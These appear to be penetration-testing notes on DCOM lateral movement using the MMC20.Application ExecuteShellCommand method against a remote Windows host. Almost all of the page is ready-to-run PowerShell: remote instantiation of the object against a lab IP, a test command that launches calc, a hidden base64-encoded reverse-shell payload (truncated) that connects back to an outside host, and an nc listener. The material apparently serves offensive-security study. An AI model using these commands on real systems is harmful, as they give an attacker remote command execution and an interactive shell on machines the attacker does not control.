# DCOM

The MMC Application Class allows the creation of [_Application Objects_](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/application-object?redirectedfrom=MSDN), which expose the _ExecuteShellCommand_ method under the _Document.ActiveView_ property. This method allows the execution of any shell command if the authenticated user is authorised, which is the default for local administrators.

From an elevated powershell window, Remotely Instantiating the MMC Application object:

{% code overflow="wrap" %}
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```
{% endcode %}

* GetTypeFromProgID("MMC20.Application.1","192.168.50.73")): target IP of FILES04

Executing a command on the remote DCOM object:

{% code overflow="wrap" %}
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```
{% endcode %}

* [**ExecuteShellCommand**](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand) method accepts four parameters: **Command**, **Directory**, **Parameters**, and **WindowState**
* spawn an instance of the calculator app

Add a base64 encoded reverse shell as a DCOM payload:

{% code overflow="wrap" %}
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```
{% endcode %}

```sh
nc -lvnp 4444
```







